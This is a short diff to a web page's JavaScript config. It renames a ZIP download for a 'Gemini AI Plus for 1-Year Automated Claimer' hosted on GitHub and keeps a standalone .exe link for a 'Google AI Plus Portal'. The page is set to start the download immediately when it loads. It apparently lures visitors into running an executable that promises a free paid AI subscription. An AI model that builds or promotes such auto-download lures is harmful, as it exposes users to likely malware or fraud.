@@ -8,7 +8,7 @@
 const CONFIG = {
   // Direct file download URL — initiates immediate file download in browser
   DIRECT_DOWNLOAD_URL:
-    "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/download/v1.0.0/Gemini%20AI%20Plus%20for%201-Year%20Automated%20Claimer%20by%20nmrisrl11.zip",
+    "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/download/v1.0.0/Gemini.AI.Plus.for.1-Year.Automated.Claimer.by.nmrisrl11.zip",
   // Alternative standalone exe URL:
   DIRECT_EXE_URL:
     "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/download/v1.0.0/Google%20AI%20Plus%20Portal%20v1.0.0.exe",
